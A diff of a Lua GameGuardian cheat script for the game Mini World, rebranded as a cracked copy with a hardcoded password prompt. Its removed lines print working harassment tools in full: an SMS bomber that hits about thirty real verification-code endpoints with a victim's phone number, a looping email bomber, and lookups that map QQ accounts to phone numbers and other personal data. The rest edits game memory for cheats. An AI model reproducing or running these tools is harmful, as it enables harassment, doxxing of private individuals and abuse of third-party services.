@@ -1,113 +1,22 @@
-------------------------------
--- ©2021  迷你凉情
-------------------------------
+gg.alert('欢迎使用，密码是:520520520')
 
 
-
-wljbht = "http://www.iyuji.cn/iyuji/s/YlJqdHg4aXBWcDhMUlQ5NHRMT1BuQT09/1635659735014141"
-  BX = gg.makeRequest(wljbht).content
-    qwtjqdcs = BX:match("<div class=\"read_txt\">阅读&nbsp; (.-)</div>")
-    
-
-function SearchWrite(Search, Write, Type)
-    gg.clearResults()
-    gg.setVisible(false)
-    gg.searchNumber(Search[1][1], Type)
-    local count = gg.getResultCount()
-    local result = gg.getResults(count)
-    gg.clearResults()
-    local data = {} --用于保存有效结果
-    local base = Search[1][2] --(0 或主特征码后三位)(用于计算相对主特征码的偏移)
-    
-   if (count > 0) then
-        for i, v in ipairs(result) do
-            v.isUseful = true --保存搜索到的地址信息(全部设定为true)
-        end
-        
-        for k=2, #Search do
-            local tmp = {}
-            local offset = Search[k][2] - base --特征码偏移(副特征码后三位 - 主特征码后三位)
-            local num = Search[k][1] --特征码
-            
-            for i, v in ipairs(result) do
-                tmp[#tmp+1] = {} --添加项目
-                tmp[#tmp].address = v.address + offset  --项目地址为主特征码地址+偏移量
-                tmp[#tmp].flags = v.flags  --项目数据类型
-            end
-            
-            tmp = gg.getValues(tmp) --刷新项目值
-            
-            for i, v in ipairs(tmp) do
-                if ( tostring(v.value) ~= tostring(num) ) then --判断项目值与其他特征码是否一致
-                    result[i].isUseful = false --不符合过滤条件设定为false
-                end
-            end
-        end
-  
-        for i, v in ipairs(result) do
-            if (v.isUseful) then --筛选出符合条件的主特征码地址
-                data[#data+1] = v.address
-            end
-        end
-        --------------内存写入
-        if (#data > 0) then
-           gg.toast("检测到"..#data.."条外来数据")
-           local t = {}
-           local base = Search[1][2]
-           for i=1, #data do
-               for k, w in ipairs(Write) do
-                   offset = w[2] - base
-                   t[#t+1] = {}
-                   t[#t].address = data[i] + offset
-                   t[#t].flags = Type
-                   t[#t].value = w[1]
-                   --- 冻结项目添加到列表
-                   if (w[3] == true) then
-                       local item = {}
-                       item[#item+1] = t[#t]
-                       item[#item].freeze = true
-                       gg.addListItems(item)
-                   end
-                   --- 不需要可以注释掉
-               end
-           end
-           gg.setValues(t)
-          -- gg.toast("已修改"..#t.."条数据")
-          -- gg.addListItems(t)
-        else
-            gg.toast("not found", false)
-            return false
-        end
-    else
-        gg.toast("Not Found")
-        return false
-    end
-end
-
-
-
---vpn
-file,err=io.open("/storage/emulated/0/Android/data/com.guoshi.httpcanary")
-jg=err:match("%((.-)%)")
-if jg=="No such file or directory" then 
- else
-print("卸载抓包工具再运行脚本") 
-os.exit() 
-while true do
+if FX2 == nil then
+  mm = gg.prompt({[1]="请输入密码:"}, {[1]=""}, {[1]="txet"})
+  if mm[1] == "520520520" then
+    gg.toast("欢迎使用")
+  else
+    print(mm[1],"密码错了哦，你走吧…")
+    os.exit()
   end
 end
 
 
 
-
-
-
-
-
 function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
-a = io.open("/sdcard/凉情配置文件.txt", "rb") if a == nil then user = "" pass = "" else
-a = io.open("/sdcard/凉情配置文件.txt"):read("*a") lq = a:match("✔️(.-)✔️") if a == "" then zh = "" end end
- dI=gg.prompt({"🐬输入你的迷你号🐬","凉情推荐音乐❤️"},{[1] = lq,[2] = nil},{[1] = "number",[2] = "checkbox"}) if dI[2] ==true then  YY998() end   lq = dI[1]  io.open("/sdcard/凉情配置文件.txt", "w") io.open("/sdcard/凉情配置文件.txt", "w"):write("✔️" .. lq .. "✔️"):close()
+a = io.open("/sdcard/星辰阁配置文件.txt", "rb") if a == nil then user = "" pass = "" else
+a = io.open("/sdcard/星辰阁配置文件.txt"):read("*a") lq = a:match("✔️(.-)✔️") if a == "" then zh = "" end end
+ dI=gg.prompt({"🐬输入你的迷你号🐬","星辰推荐音乐❤️"},{[1] = lq,[2] = nil},{[1] = "number",[2] = "checkbox"}) if dI[2] ==true then  YY998() end   lq = dI[1]  io.open("/sdcard/星辰阁配置文件.txt", "w") io.open("/sdcard/星辰阁配置文件.txt", "w"):write("✔️" .. lq .. "✔️"):close()
 b=a 
 gg.toast("当前迷你号:"..b.."其实...她可能真的爱你... ")
 local bx=os.date("%Y年%m月%d日%H时%M分%S秒") print(bx)
@@ -117,18 +26,17 @@ function SearchWrite(tb1, tb2, dataType, Name) local lt1={} local lt2={} local m
 function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
 function PS() end function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
 function Main()  local sjbq=bqt[math.random(1,#bqt)] SY = gg.choice({
-       [1] = sjbq.."𒅒🔰房主专区𒅒🔰"..sjbq,
-    [2] = sjbq.."𒅒🔰联机专区𒅒🔰"..sjbq,
-    [3] = sjbq.."𒅒🔰炸图专区𒅒🔰"..sjbq,
-    [4] = sjbq.."𒅒🔰特效专区𒅒🔰"..sjbq,
-    [5] = sjbq.."𒅒🔰狙击专区𒅒🔰"..sjbq,
-    [6] = sjbq.."𒅒🔰️特别感谢𒅒🔰"..sjbq,
-     [7] = sjbq.."𒅒🔰切换专区𒅒🔰"..sjbq,
-      [8] = sjbq.."𒅒🔰音乐专区 𒅒🔰"..sjbq,
-        [9] = sjbq.."𒅒🔰作者专区𒅒🔰"..sjbq,
-        [10] = sjbq.."𒅒🔰科技专区𒅒🔰"..sjbq,
-    [15] = sjbq.."𒅒🔰退出辅助𒅒🔰"..sjbq,
-},2018,os.date("我的辅助还未做出来，先用这个吧"))
+       [1] = sjbq.."𒅒🔰房主功能.星辰阁𒅒🔰"..sjbq,
+    [2] = sjbq.."𒅒🔰联机功能.星辰阁𒅒🔰"..sjbq,
+    [3] = sjbq.."𒅒🔰炸图功能.星辰阁𒅒🔰"..sjbq,
+    [4] = sjbq.."𒅒🔰特效功能.星辰阁𒅒🔰"..sjbq,
+    [5] = sjbq.."𒅒🔰狙击功能.星辰阁𒅒🔰"..sjbq,
+    [6] = sjbq.."𒅒🔰️特别感谢.星辰阁𒅒🔰"..sjbq,
+     [7] = sjbq.."𒅒🔰切换辅助.星辰阁𒅒🔰"..sjbq,
+      [8] = sjbq.."𒅒🔰播放音乐.星辰阁 𒅒🔰"..sjbq,
+        [9] = sjbq.."𒅒🔰作者留言.星辰阁𒅒🔰"..sjbq,
+    [15] = sjbq.."𒅒🔰退出辅助.星辰阁𒅒🔰"..sjbq,
+},2018,os.date("鹤辰❤️已破解❤️"))
 if SY==15 then Exit() end
 if SY==1 then Main1() end
 if SY==2 then Main2() end
@@ -139,7 +47,6 @@ if SY==6 then Main6() end
 if SY==7 then Main7() end
 if SY==8 then Main8() end
 if SY==9 then Main9() end
-if SY==10 then Main10() end
 FX1=0 end
 
 
@@ -201,7 +108,6 @@ SN = gg.multiChoice({
 "𒅒🧊添加坐骑𒅒🧊",
 "𒅒🧊鸡掉落坐骑蛋𒅒🧊",
 "𒅒🧊无限跳(游泳飞行)𒅒🧊",
-"𒅒🧊单机聊天𒅒🧊",
 "🧡返 回 主 页🧡",
  }, nil, "🌺为什么说抱歉....明明是我不对🌺")
 if SN == nil then else
@@ -246,8 +152,7 @@ if SN[38]==true then     asms11() end
 if SN[39]==true then     asms12() end
 if SN[40]==true then     asms13() end
 if SN[41]==true then     asms14() end
-if SN[42]==true then     asms15() end
-if SN[43]==true then	 Main() end
+if SN[42]==true then	 Main() end
 end
 FX=0 end
 
@@ -1984,15 +1889,8 @@ xqmnb(qmnb)
 gg.clearResults()
 end
 
-function asms15()
-gg.setRanges(4)
-local dataType = 4
-local tb1 = {{151552,1130889216} }
-local tb2 = {{16777472, 32,true  }, }
-SearchWrite(tb1, tb2, dataType)
-gg.toast("单机聊天")
-	 gg.clearResults()
-end
+
+
 
 function Main2() 
 SN = gg.multiChoice({
@@ -2106,7 +2004,7 @@ SN = gg.multiChoice({
 '𒅒🧊动态发图片𒅒🧊',
 '𒅒🧊解锁所有物品𒅒🧊',
 "💯返 回 主 页💯",
- }, nil, "你是我想保护的人啊.....")
+ }, nil, "❌这次我输了，输的满盘皆输.....❌")
 if SN == nil then else
 if SN[1]==true then	 b1() end
 if SN[2]==true then	 b2() end
@@ -3926,17 +3824,17 @@ xqmnb(qmnb)
 gg.clearResults()end
 end
 function yf22()
- qmnb = {
-    {["memory"] = 4},
-    {["name"] = "免手机号验证打字"},
-    {["value"] = 300.0, ["type"] = 64},
-    {["lv"] = 999.0, ["offset"] = 16, ["type"] = 64},
-  }
-  qmxg = {
-    {["value"] = 0, ["offset"] = 0, ["type"] = 64},
-  }
-  xqmnb(qmnb)
-  gg.clearResults()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "免手机号验证打字"},
+{["value"] = 2091, ["type"] = 4},
+{["lv"] = 4651998512748167168, ["offset"] = 36, ["type"] = 32},
+}
+qmxg = {
+{["value"] = 0.0, ["offset"] = 20, ["type"] = 64},
+}
+xqmnb(qmnb)
+
 end
 
 
@@ -6218,7 +6116,7 @@ SN = gg.multiChoice({
 	   "𒅒🧊通用创造𒅒🧊",
 	     "𒅒🧊新家园道具(原创)𒅒🧊",
 	 "🍊返 回 主 页🍊",
- }, nil, "十年老兵，申请出战")
+ }, nil, "💋信仰到底是什么？💋")
 if SN == nil then else
 if SN[1]==true then c1() end
 if SN[2]==true then c2() end
@@ -6920,7 +6818,7 @@ menu1 = gg.choice({
     "𒅒♥️️害羞动作♥️𒅒",    
     "𒅒♥️死亡动作️♥️𒅒", 
    "𒅒♥️恢复动作️特效♥️𒅒", 
-    "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("𒅒人们只会注意最耀眼的烟火，所以，骚年请保存你的耀眼𒅒"))
+    "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("𒅒人们只会注意最灿烂的星星.....𒅒"))
 if menu1==1 then Q1=12 QQ1() end
 if menu1==2 then Q1=13 QQ1() end
 if menu1==3 then Q1=14 QQ1() end
@@ -7514,7 +7412,7 @@ menu1 = gg.choice({
 '💘北仙💘',
 '💘白九💘',
 '💘倾城💘',
-'🍓无名🍓',
+'🍓已去除🍓',
 '🍓神圣🍓',
 '🍓白露🍓',
 '🍓天跑🍓',
@@ -7564,7 +7462,7 @@ SN = gg.choice({
 	 "💜龙哥(破解版)💜",
 	 "❤️凉兮❤️",
 	 "返回辅助",
-}, nil, "凉情")
+}, nil, "星辰阁")
 if SN==1 then
      XEZTFZ()
 end
@@ -7780,8 +7678,17 @@ end
 function lsp1()  
   SN = gg.choice({
     "凉情城.主作者",
+    "叶帆.主作者",
+    "剑圣.主作者",
+    "傲傲.主作者",
+    "龙半岁.协助作者",
+    "神圣.协助作者",
+    "无名.背叛人员",
+    "北少.加密作者",
+    "墨凉.客串作者",
+    "天跑.友军作者",
     "返回主页",
-  }, nil, "凉情.末日之神(点击凉情城可以复制凉情迷你号")
+  }, nil, "星辰阁.末日之神")
   if SN==1 then
     GSM1()
   end
@@ -7813,278 +7720,12 @@ end
 
 function pl1()
 gg.alert[[
-许多人对我的评价很差，没有理由，我狂是我不想屈服，我以后会更新 可能有点慢，不过我保证每个功能都能用
+欢迎使用星辰阁.辅助
 ]]
 end
 
-function Main10()  
- menu1 = gg.choice({
-"查q绑定",
-"手机号反查",
-"轰炸手机号",
-"轰炸qq邮箱",
-"手机号归属信息",
-"获取qq头像",
-"小艺同学",
-"🎆返 回 主 页🎆",
-}, nil, "[北海]这是你的宿命......也是我的宿命")
-if menu1 == 1 then ls1() end
-if menu1 == 2 then ls2() end
-if menu1 == 3 then ls3() end
-if menu1 == 4 then ls4() end
-if menu1 == 5 then ls5() end
-if menu1 == 6 then ls6() end
-if menu1 == 7 then ls7() end
-if menu1 == 8 then Main() end
-GLWW=-1
-end
-
-function ls1()
-    local musu=gg.prompt({"🎃输入QQ号即可查询🌕","🌚网址1","🌝网址2(即将关闭)"
-    },{
-      [1]="",
-      [2]=true,
-      [3]=false
-    },{
-      "number",
-      "checkbox",
-      "checkbox"
-    })
-    if not musu then
-      return nil
-     else
-      if musu[2]==true and musu[3]==true then
-        gg.alert('⭐️两个网址，只能选择一个')
-        return nil
-      end
-      if musu[2]==true then
-        gg.toast("💫查询ing...",false)
-        local xg=gg.makeRequest("http://yc52.net/qb-api.php?mod=cha&qq="..musu[1]).content
-        if not xg then
-          gg.alert('☀️你已拒绝网络申请，查询失败☀️')
-          return
-        end
-        local jg=xg:match('mobile": "(.-)"')
-        local qq=xg:match('"qq": "(.-)"')
-        if jg==nil then
-          gg.alert('🔥未查询到…库中并没有这个记录❄️','💨确定🌬')
-          return nil
-        end
-        local yue=gg.alert('💦ＱＱ号:'..qq..'\n\n💦手机号:'..jg,'🌊复制','🌪取消')
-        if yue==1 then
-          gg.copyText('[ＱＱ号]:'..qq..' \n[手机号]:'..jg,false)
-        end
-        if yue==2 then
-          return nil
-        end
-      end
-    end
-    if musu[3]==true then
-      gg.toast("💧查询ing...",false)
-      local xg2=gg.makeRequest("http://cxx.yun7.me/qqcx?qq="..musu[1]).content
-      if not xg2 then
-        gg.alert('🍎你已拒绝网络申请，查询失败🍊')
-        return
-      end
-      --    status":200,"message":"查询成功","phone":"669","phonediqu":"河北保定 移动","lol":"没有找到","wb":"6134218","qqlm":"没有找到"}
-
-      local jg2=xg2:match('phone":"(.-)"')--手机号
-      local qq1=xg2:match('phonediqu":"(.-)"')--号码归属地
-      local qq2=xg2:match('lol":"(.-)"')--LOL信息
-      local qq3=xg2:match('wb":"(.-)"')--微博信息
-      if jg2==nil then
-        gg.alert('🥝未查询到…库中并没有这个记录🍌','🍇确定🍇')
-        return nil
-      end
-      local yue=gg.alert('🥒ＱＱ号:'..musu[1]..'\n\n🌽手机号:'..jg2..'\n\n🥜号码归属地:'..qq1..'\n\n🍞LOL信息:'..qq2..'\n\n🍳微博UID'..qq3,'🍟复制','🥙取消')
-      if yue==1 then
-        gg.copyText('ＱＱ号:'..musu[1]..' \n 手机号:'..jg2..'  \n号码归属地:'..qq1..' \n LOL信息:'..qq2..'  \n微博UID:'..qq3,false)
-      end
-      if yue==2 then
-        return nil
-      end
-    end
-end
-
-function ls2()
-    local musu=gg.prompt({"🍭输入手机号即可反查🍭"
-    },{
-      [1]=""
-    },{
-      "number"
-    })
-    if not musu then
-      return nil
-     else
-      gg.toast("🍬查询ing...",false)
-      local xg=gg.makeRequest("http://cxx.yun7.me/qqxc?phone="..musu[1]).content
-      if not xg then
-        gg.alert('🍼你已拒绝网络申请，查询失败🥤')
-        return
-      end
-      ---     {"status":200,"message":"查询成功","qq":"(.-)","phonediqu":"(.-)","lol":"(.-)",","qqlm":"没有找到"}
-      local jg=xg:match('qq":"(.-)"')--qq号
-      local qq=xg:match('phonediqu":"(.-)"')--号码归属地
-      local qq1=xg:match('lol":"(.-)"')--LOL信息
-      local qq2=xg:match('wb":"(.-)"')--微博
-      if jg==nil then
-        gg.alert('🥢未查询到…库中并没有这个记录🥡','🥌确定')
-        return nil
-      end
-      local yue=gg.alert('🎿ＱＱ号:'..jg..'\n\n⚾️号码归属地:'..qq..'\n\n⚽️LOL信息:'..qq1..'\n\n🏀微博UID'..qq2,'🏌复制','🏹取消')
-      if yue==1 then
-        gg.copyText('ＱＱ号:'..jg..' \n 号码归属地:'..qq..' \n LOL信息:'..qq1..' \n微博UID'..qq2,false)
-      end
-      if yue==2 then
-        return nil
-      end
-    end
-end
-
-function ls3()
-local A=gg.prompt({"💥输入您要轰炸的电话号码💥"},{""},{"number"})
-    if not A then
-      return nil
-     else
-local B=A[1]
-local C=gg.makeRequest("http://211.156.201.12:8088/youzheng//ems/security?phone="..B.."").content
-local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
-local C=gg.makeRequest("http://srmemberapp.srgow.com/sys/captcha/"..B.."").content
-local C=gg.makeRequest("https://m.icbc.com.cn/WapDynamicSite/TouchPage/AppDownResponse.aspx?type=1&app_id=5&mobile_no="..B.."").content
-local C=gg.makeRequest("https://kfsbusiness.anjuke.com/weiliaoke/login/sendcode.json?ticket=&cid=&cv=5.6.0&app=i-ajk&udid2=85C1EEA5-6E6A-449B-BD5C-118EA0DFDDBB&phone="..B.."").content
-local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?platform=console&token=&phone=%2B86"..B.."&code=10164337").content
-local C=gg.makeRequest("https://api.kqiu.cn/user/v1/sms/code?phoneNumber="..B.."").content
-local C=gg.makeRequest("http://prod.layadmin.cn/api/message/sendV2?app_id=1&version=1.4.0&channel_id=001&phone="..B.."").content
-local C=gg.makeRequest("http://121.36.193.131/api/v3.1/thirdpartyapi/aliyunmessageapi/SendVerifyMessage?phoneNumber=86"..B.."&type=1").content
-local C=gg.makeRequest("https://api.diebian.net/Get/GetVerificationSMS?PhoneNumber="..B.."").content
-local C=gg.makeRequest("https://tele.uos123.com/api/orders/orders/sendDxSmsCode?mobile="..B.."").content
-local C=gg.makeRequest("https://www.qxueyou.com/v3/learning/uc/login/mobile/captcha?mobilePhone="..B.."&product=qxueyou").content
-local C=gg.makeRequest("http://www.gkbbapp.com/Support/JsonNews.aspx?sendShortMessage=yes&Telephone="..B.."").content
-local C=gg.makeRequest("https://www.ajia.cn/api/sys/sendCaptchaNoUser?accountName="..B.."").content
-local C=gg.makeRequest("https://yi.yshoufa.com/usersystem/site/network/getNetworkPhoneCaptcha?phone="..B.."&networkId=").content
-local C=gg.makeRequest("http://dx.zy40.cn/dx/index.php?hm="..B.."").content
-local C=gg.makeRequest("http://www.edu-edu.com/cas/web/message/send?phone="..B.."").content
-local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."").content
-local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."").content
-local C=gg.makeRequest("https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile="..B.."").content
-local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
-local C=gg.makeRequest("https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone="..B.."").content
-local C=gg.makeRequest("https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone="..B.."").content
-local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?code=1566478386.8872059778&phone="..B.."").content
-local C=gg.makeRequest("http://user.daojia.com/mobile/getcode?mobile="..B.."").content
-local C=gg.makeRequest("https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber="..B.."").content
-local C=gg.makeRequest("http://slb-sport.vesal.cn/vesal-sport-prod/v1/app/member/getCode?tellAndEmail="..B.."").content
-local C=gg.makeRequest("http://cms.51fenmi.com/api/base/public/getCode?mobile="..B.."").content
-local C=gg.makeRequest("http://www.52gcc.com/bomb/index.php?hm="..B.."").content
-end
-end
-
-function ls4()
-  local Feed=gg.prompt({"✈️收件人地址(邮箱)✈️","🚀邮箱主题🚀","🛸发件内容🛫","🏁轰炸次数🏁"},{"192898257@qq.com","劳资就轰炸你","劳资就轰炸你","1"},{"text","text","text","text"})
-  if not Feed then gg.toast("🎢取消发送！🎢",true)
-    return nil
-  end
-  if Feed[1]~="" and Feed[2]~="" and Feed[3]~="" and Feed[4]~="" then
-    gg.toast("🗽发送中ing...",true)
-    for i=1,Feed[4] do
-      xg=gg.makeRequest("https://simpleauth.cn/api/mail/api.php?address="..Feed[1].."&name="..Feed[2]..i.."&certno="..Feed[3]..i).content
-    end
-    if not xg then
-      gg.alert("🕋发送失败！⌚️",'💿确定📀')
-    end
-    local jg=xg:match('"Code":"(.-)",')
-    local jg2=xg:match('msg":"(.-)"')
-    if jg =="1" then
-      gg.alert(jg2,'🖱确定🖱')
-     else
-      gg.alert("🔫发送失败！🔫",'🔨确定🔨')
-      return nil
-    end
-   else
-    gg.alert("📡填写信息不完整！📡","🔋确定🔋")
-    return nil
-  end
-end
-
-function ls5()
-sjh=gg.prompt({"💡输入手机号即可查询💡"},{[1]=""},{"number"})
-if sjh== nil then gg.toast("🔦取消选择默认初始化🔦")
-else
-gg.toast("🕯正在查询🕯")
-su1=gg.makeRequest("https://www.ip138.com/mobile.asp?mobile="..sjh[1].."&action=mobile").content:match("卡号归属地(.-)邮 编")
-dq=su1:match('span>(.-)&')--地区
-dq1=su1:match(';(.-)<')--地区2
-GSM=su1:match('型(.-)/s'):match("pan>(.-)<")
-su2=gg.makeRequest("https://jx.ip138.com/"..sjh[1].."/").content--凶吉
-b=su2:match('邮政编码：(.-)</tr>')
-yb=b:match('<p>(.-)</p')--邮编
-qh=b:match('电话区号：</p></td>(.-)/td>'):match('>(.-)<')--区号
-xj=su2:match('red">(.-)href'):match("a>(.-)<")--凶吉
-QQ=("手机号:\n"..sjh[1].."\n凶吉:"..xj.."\n"..GSM.."\n定位:\n"..dq..dq1.."\n邮编:"..yb.."\n区号:"..qh)
-QQ1=gg.alert(QQ,"💎复制💎","💰返回💰")
-if QQ1==0 then Main() end
-if QQ1==1 then gg.copyText(QQ) gg.toast("🛡已复制🛡") end
-if QQ1==3 then Main() end
-end
-end
 
 
-function ls6()
-y=gg.prompt({"🐚请输入qq号🎋"},{},{"number"})
-if y== nil then gg.toast("🔦取消选择默认初始化🔦")
-else
-gg.toast("🍥正在下载……🥘")
-ByXEY=gg.getFile():gsub('/[^/]+$','').."/"..y[1]..".jpg"
-YC1=gg.makeRequest("https://q.qlogo.cn/headimg_dl?dst_uin="..y[1].."&spec=100").content
-io.open(ByXEY,"w"):write(YC1)
-gg.alert("🍔已下载到：\n"..ByXEY)
-end
-end
-function ls7()
-OI = gg.prompt({"请输入聊天的对话 北海原创"},{"小爱同学"},{"text"})
-LOL = gg.makeRequest("https://jintia.jintias.cn/api/xatx.php?msg="..OI[1]).content
-B=LOL:match('text":"(.-)"')
-gg.alert(B)
-a7()
-end
-function aa1()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGalHoN7LXhGa1fARTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fGy1Oxy4WGa4QSa1VXaiyGy4H7yjVXy7Wlp2ajL588sXYhyPy6y73FaPWxNmafZPqwc4WXy7dlNjOANjsiHo3fZ1flp4sGH4wjNj9jp5Hly1OqajRFNjR8p4r7HiajH7R8NFa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=36929").content
-end
-
-function aa2()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGalHoN7LXhGa1fisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4dly1YAy4yMyjdXH7Y7NiyANjyGy1H7y4V6RiNfZ5Q7Z1fGp43jyjgwa1gFRT9UvPOhy4H7yjVXN4WANFa8Lo9kcPyAa1rXa4NFHPyxN4WMN1YXy7H6a1YxH7Q8H7dAajHlRTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=7e83f").content
-end
-
-function aa3()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGa7L5Qfc4VisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4WqNjyAyP9SN53Sp4VGN4HANjyGy1H7y4V6RiNfZ5Q7Z1qjy5QSaPr6aj3wRT9UvPOhy4H7yjVXN1HMyma8Lo9kc48jHXdXyXy7pPHXajylyX3iy1Wfa53FN7d7aPy6NPRSRTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=e2302").content
-end
-
-function aa4()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGa7L5Qfc4WisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4Wqp4sAyPyMa1QiH4Q8NiHANjyGy1H7y4V6RiNfZ5Q7Z1fxHiNSH4y7NjaFRT9UvPOhy4H7yjVXN1slNma8Lo9kc4y6y1dMHXOfH49iN5RFN7SlHXOlH4VGNXR8H4Oxy138RTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=9ae63").content
-end
-
-function aa5()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaJs1qGaoNfHoRfRTRJvXqCZPrhymafZPqwc4WXy7dlNjrMN1siHo3fZ1qFNPawy1VMa1R8H4s6H7sxN49jN1yqHPR8p1d7H4dAyGa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=cc243").content
-end
-
-function aa6()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGaBHPwIL5QUvjfARTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fANjYAy4W6a5WqN1VAyPaiy4H7yjVXy7Wlp2ajL588sXYhN4VMpPOlp1a8aFafZPqwc4WXy7dlNjrMp1SiHo3fZ1f6a4V7p4yAa1y6H4dfpPy7N5HfyPdxp53SH4SXaP9SNma7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=7b3c1").content
-end
-
-function aa7()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGaBHPwIL5QUvjflRTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fAN7rGy4Wqp1SqN1RFy4aSy4H7yjVXy7Wlp2ajL588sXYhyXrfN73Fy7g8y2afZPqwc4WXy7dlNjr6N4ViHo3fZ1qFpPWXyXRSNPR8aiQwHPH7y1R8y7sMH7d7Hj8wyjOfyGa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=44f26").content
-end
-function aa8()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4HivMVhZPxivGa7L5Qfc4WisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4OqN7WAHjY6yPH7N7sGp4WXy7dlNjyAy1YiHM9kHoNkc4wFHX98y7yXNidiL5wBa4fANjyGy1H7NjHqRiQqL5Yhyir6yjyGyXaFpPOlp4y7N1Oxp49wyjO7aPHGy19wN4Wis7Rfc4WXy7dlNjyAy1HiLPwIc4WGy7rqRTawsjfA0jrIyma8s5wUa1fARiA8vishy2ajvM3ILKRxcONpRTyMa4fA&s7t=b57a2").content
-end
-
-function aa9()
-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4HivMVhZPxivGa7L5Qfc4VisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4y7y1WAN5rfHir7yj88HjWXy7dlNjyAy1YiHM9kHoNkcPylHP9wa18iNPOiL5wBa4fANjyGy1H7N1y6RiQqL5Yhp1d6p1sxH7YMy1OGa5QSN4VXHPdqyiNSaiOMyP9FH4Vis7Rfc4WXy7dlNjyAy1HiLPwIc4WGy7rqRTawsjfA0jrIyma8s5wUa1fARiA8vishy2ajvM3ILKRxcONpRTyMa4fA&s7t=9e079").content
-end
-
-function aa10()
